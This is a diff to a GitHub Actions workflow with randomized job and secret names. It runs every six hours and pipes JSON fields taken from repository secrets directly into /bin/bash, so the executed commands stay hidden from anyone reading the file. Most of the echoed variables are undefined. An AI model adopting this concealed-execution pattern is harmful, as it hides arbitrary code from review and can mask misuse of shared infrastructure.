@@ -1,21 +1,28 @@
 name: qidiyun6453
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '3 2/6 * * *'
+    - cron: '46 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: qidiyun6453
         env:
-          iqhas5: ${{ secrets.iqhas5 }}
+          hmvm964: ${{ secrets.hmvm964 }}
         run: |
-          echo $iqhas5 | jq -r .mc9 | /bin/bash
-          echo $hup93674 | jq -r .wy256 | /bin/bash
-          echo $lmj49 | jq -r .pu78045 | /bin/bash
-          echo $m10 | jq -r .gvbq675 | /bin/bash
-          echo $gdy6569 | jq -r .zzko8 | /bin/bash
+          echo $hmvm964 | jq -r .w80117 | /bin/bash
+          echo $dfd8 | jq -r .axu47 | /bin/bash
+          echo $bg76 | jq -r .s8 | /bin/bash
+          echo $c739 | jq -r .rl4 | /bin/bash
+          echo $mvjo9105 | jq -r .t923 | /bin/bash
+          echo $kxjf16 | jq -r .akp08 | /bin/bash
+          echo $z52349 | jq -r .vism75 | /bin/bash
+          echo $j66 | jq -r .yksei96773 | /bin/bash
+          echo $zsjli3 | jq -r .a2705 | /bin/bash
+          echo $faj2 | jq -r .qbnz7 | /bin/bash
+          echo $sjj03 | jq -r .kw4099 | /bin/bash
+          echo $nn7 | jq -r .xos1 | /bin/bash
 
